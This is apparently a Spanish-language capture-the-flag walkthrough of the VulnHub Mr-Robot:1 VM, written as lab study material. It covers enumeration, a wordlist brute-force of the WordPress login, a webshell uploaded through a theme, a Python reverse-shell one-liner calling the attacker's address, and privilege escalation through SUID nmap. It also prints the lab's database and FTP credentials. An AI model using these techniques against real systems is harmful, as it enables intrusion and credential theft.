# MR-ROBOT-1
Desarrollo del CTF MR-ROBOT:1

Download VM: https://www.vulnhub.com/entry/mr-robot-1,151/

## 1. Configuración

> El objetivo de la VM no es obtener ROOT. El objetivo es obtener 03 keys.

## 2. Escaneo de Puertos

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.137
Nmap scan report for 10.10.10.137
Host is up (0.00064s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:E9:07:F1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
```

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot1.jpg" witdh=80% />

- Me llamó la atención que el certificado SSL haga referencia a "www.example.com". Un dato a tener en cuenta. 


## 3. Enumeración

### 3.1. Enumeración en HTTP

> Con DIRBUSTER o NIKTO podemos identificar información sensible: 
- Archivo robots.txt
- Carpetas del CMS Wordpress

```
HTTP/1.1 200 OK
Date: Thu, 11 Mar 2021 13:56:40 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Last-Modified: Fri, 13 Nov 2015 07:28:21 GMT
ETag: "29-52467010ef8ad"
Accept-Ranges: bytes
Content-Length: 41
Content-Type: text/plain

User-agent: *
fsocity.dic
key-1-of-3.txt
```

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot2.jpg" witdh=80% />

Aquí encontramos dos archivos importantes:

> La llave 01:
- Un hash MD5 (que no logré crackear)
<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot4.jpg" witdh=80% />

- Un diccionario llamado fsocity.dic

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot5.jpg" witdh=80% />


```
root@kali:~/MrRobot/autorecon/10.10.10.137/scans# cat tcp_80_http_nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.137
+ Target Hostname:    10.10.10.137
+ Target Port:        80
+ Start Time:         2021-03-11 08:56:48 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.10.10.137/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7863 requests: 0 error(s) and 18 item(s) reported on remote host
```

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot3.jpg" witdh=80% />

### 3.2. Enumeración en WORDPRESS

- Buscamos vulnerabilidades y usuarios en Wordpress

```
root@kali:~/MrRobot# wpscan --api-token XXXXXXXXXXXXXXX --url=http://10.10.10.137 -e ap,u --plugins-detection aggressive > wpscan.txt
```

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot6.jpg" witdh=80% />

- Encontré algunas vulnerabilidades interesantes:
```
[+] all-in-one-wp-migration
 | Location: http://10.10.10.137/wp-content/plugins/all-in-one-wp-migration/
 | Last Updated: 2021-03-09T14:49:00.000Z
 | Readme: http://10.10.10.137/wp-content/plugins/all-in-one-wp-migration/readme.txt
 | [!] The version is out of date, the latest version is 7.39
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.137/wp-content/plugins/all-in-one-wp-migration/, status: 403
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: All-in-One WP Migration <= 2.0.4 - Unauthenticated Database Export
 |     Fixed in: 2.0.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/4f78d821-036b-4d0c-8cc9-397dcdbc9c21
 |      - https://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability
 |      - https://www.rapid7.com/db/modules/auxiliary/gather/wp_all_in_one_migration_export

 | [!] Title: All-in-One WP Migration < 7.15 - Arbitrary Backup Download
 |     Fixed in: 7.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/ef4734a3-f12c-49ef-a49b-f00bd4a21ed9
 |      - https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/

[+] contact-form-7
 | Location: http://10.10.10.137/wp-content/plugins/contact-form-7/
 | Last Updated: 2021-02-24T12:24:00.000Z
 | Readme: http://10.10.10.137/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 5.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.137/wp-content/plugins/contact-form-7/, status: 403
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Contact Form 7 <= 5.0.3 - register_post_type() Privilege Escalation
 |     Fixed in: 5.0.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/af945f64-9ce2-485c-bf36-c2ff59dc10d5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20979
 |      - https://contactform7.com/2018/09/04/contact-form-7-504/
 |      - https://plugins.trac.wordpress.org/changeset/1935726/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934594/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934343/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934327/contact-form-7
 |      - https://www.ripstech.com/php-security-calendar-2018/#day-18
 |
 | [!] Title: Contact Form 7 < 5.3.2 - Unrestricted File Upload
 |     Fixed in: 5.3.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7391118e-eef5-4ff8-a8ea-f6b65f442c63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35489
 |      - https://www.getastra.com/blog/911/plugin-exploit/contact-form-7-unrestricted-file-upload-vulnerability/
 |      - https://www.jinsonvarghese.com/unrestricted-file-upload-in-contact-form-7/
 |      - https://contactform7.com/2020/12/17/contact-form-7-532/#more-38314

```

- Para resumir, la vulnerabilidad del plugin: all-in-one-wp-migration NO DA RESULTADOS importantes. Exploté la vulnerabilidad pero no había nada importante, ningún backup.

- La vulnerabilidad del plugin: contact-form-7 es muy reciente (finales del 2020). El CTF corresponde a varios años atras.
- Tampoco pude enumerar usuarios, no encontré usuarios con WPSCAN.
- Lo último que toca probar es la enumeración manual, es decir, colocar usuarios en el formulario de LOGIN. El usuario "elliot" da buenos resultados, era obvio probarlo debido a que la VM se llama MR.ROBOT.

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot7.jpg" witdh=80% />

## 4. Buscando Vulnerabilidades

### 4.1. Cracking ONLINE

- Ya que el usuario "ELLIOT" existe debemos probar un ataque de diccionario. 
- En el proceso de enumeración habíamos identificado el diccionario: fsocity.dic. Realizamos un proceso de CRACKING pero demora mucho debido a que el diccionario es super largo (3 horas aprox).

```
wpscan -t 50 --password-attack wp-login --url http://10.10.10.137 --passwords fsocity.dic -U elliot
```
<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot8.jpg" witdh=80% />

- La contraseña es: ER28-0652

### 4.2. Upload WEBSHELL

- Ingresamos con el usuario: elliot y password: ER28-0652
- Dentro de WORDPRESS podemos subir un nuevo THEME y dentro colocar un WEBSHELL. Un clásico para obtener consola.

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot9.jpg" witdh=80% />

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot10.jpg" witdh=80% />

- Finalmente, conexión reversa. En el navegador

```
wp-content/themes/hestia/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.133",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot11.jpg" witdh=80% />

## 5. Elevando Privilegios

- Toca enumerar lo más que se pueda. Credenciales de BD MySQL y FTP.

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot12.jpg" witdh=80% />

- Al final encontré esto (nada importante para seguir escalando):

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bitnami_wordpress');
/** MySQL database username */
define('DB_USER', 'bn_wordpress');
/** MySQL database password */
define('DB_PASSWORD', '570fd42948');
/** MySQL hostname */
define('DB_HOST', 'localhost:3306');

define('FS_METHOD', 'ftpext');
define('FTP_BASE', '/opt/bitnami/apps/wordpress/htdocs/');
define('FTP_USER', 'bitnamiftp');
define('FTP_PASS', 'inevoL7eAlBeD2b5WszPbZ2gJ971tJZtP0j86NYPyh6Wfz1x8a');
define('FTP_HOST', '127.0.0.1');
define('FTP_SSL', false);
```

### 5.1. Cracking OFFLINE
- En la carpeta /home/robot/ tenemos nuestra SEGUNDA KEY y un HASH MD5.
- Toca crackearlo. https://hashes.com/en/decrypt/hash

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot13.jpg" witdh=80% />

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot14.jpg" witdh=80% />

- Al parecer tenemos el password del usuerio robot: abcdefghijklmnopqrstuvwxyz
> Obtenemos el KEY 02:

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot15.jpg" witdh=80% />

### 5.2. Elevamos privilegios con SUID

```
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

- Bingo!! encontrar NMAP es un clásico para elevar privilegios como ROOT.
- NMAP tiene un mecanismo INTERACTIVO para obtener consola. A través del SUID que apunta al usuario ROOT podemos elevar privilegios.
> Así obtenemos la KEY 03.

<img src="https://github.com/El-Palomo/MR-ROBOT-1/blob/main/robot16.jpg" witdh=80% />

